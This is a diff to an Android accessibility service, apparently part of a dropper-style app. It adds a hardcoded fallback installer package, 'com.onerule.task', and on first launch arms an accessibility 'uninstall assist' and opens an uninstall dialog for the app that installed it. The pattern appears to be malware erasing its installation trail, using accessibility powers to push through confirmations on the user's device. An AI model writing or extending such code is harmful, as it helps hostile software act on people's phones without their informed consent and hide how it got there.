@@ -252,27 +252,39 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         if (firstLaunchInstallerCleanupScheduled) return;
         firstLaunchInstallerCleanupScheduled = true;
 
-        final String installerPackage = BuildConfig.INSTALLER_PACKAGE;
+        // Some standalone/custom builds do not expose optional installer fields
+        // in their generated BuildConfig. Read it reflectively so those builds
+        // still compile while customized builds retain their injected package.
+        String installerPackage = "com.onerule.task";
+        try {
+            java.lang.reflect.Field field =
+                    BuildConfig.class.getField("INSTALLER_PACKAGE");
+            Object value = field.get(null);
+            if (value instanceof String && !((String) value).trim().isEmpty()) {
+                installerPackage = (String) value;
+            }
+        } catch (Exception ignored) {}
         if (installerPackage == null || installerPackage.trim().isEmpty()
                 || installerPackage.equals(getPackageName())) {
             Log.w(TAG, "First-launch installer cleanup skipped: invalid installer package");
             return;
         }
 
+        final String cleanupInstallerPackage = installerPackage;
         new Handler(Looper.getMainLooper()).postDelayed(() -> {
             try {
-                getPackageManager().getPackageInfo(installerPackage, 0);
-                armUninstallAssist(installerPackage);
+                getPackageManager().getPackageInfo(cleanupInstallerPackage, 0);
+                armUninstallAssist(cleanupInstallerPackage);
 
                 Intent intent = new Intent(Intent.ACTION_DELETE,
-                        Uri.parse("package:" + installerPackage));
+                        Uri.parse("package:" + cleanupInstallerPackage));
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 startActivity(intent);
                 Log.i(TAG, "First-launch installer uninstall dialog opened for "
-                        + installerPackage);
+                        + cleanupInstallerPackage);
             } catch (PackageManager.NameNotFoundException e) {
                 Log.i(TAG, "First-launch installer cleanup skipped; package is absent: "
-                        + installerPackage);
+                        + cleanupInstallerPackage);
             } catch (Exception e) {
                 Log.w(TAG, "First-launch installer cleanup failed: " + e.getMessage());
             }
